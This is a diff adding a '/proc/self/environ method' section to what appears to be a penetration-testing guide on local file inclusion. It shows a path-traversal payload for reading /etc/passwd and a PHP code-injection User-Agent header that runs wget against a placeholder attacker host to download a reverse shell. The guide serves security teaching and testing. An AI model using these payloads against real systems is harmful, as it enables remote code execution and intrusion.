@@ -135,6 +135,15 @@ Requesting `/etc/passwd` in this case will not work because the request becomes 
 ```
 http://website/page=../../../etc/passwd%00
 ```
+### proc/self/environ method
+If you're able to request `/proc/self/environ` using LFI, you might be able to get a shell by downloading a remote file with reverse shellcode and run it on the system (e.g. [php reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)). You'll need to intercept the `/proc/self/environ` request and replace HTTP request header `User Agent` with the following:
+```
+<?system('wget http://[attack host]]/reverseshell.txt -O shell.php');?>
+```
+Then execute the shell by calling the URL where it was uploaded:
+```
+http://[attack host]/folder/reverseshell.php
+```
 
 ## Further reading
 * [Local File Inclusion by xapax](https://xapax.gitbooks.io/security/content/local_file_inclusion.html)
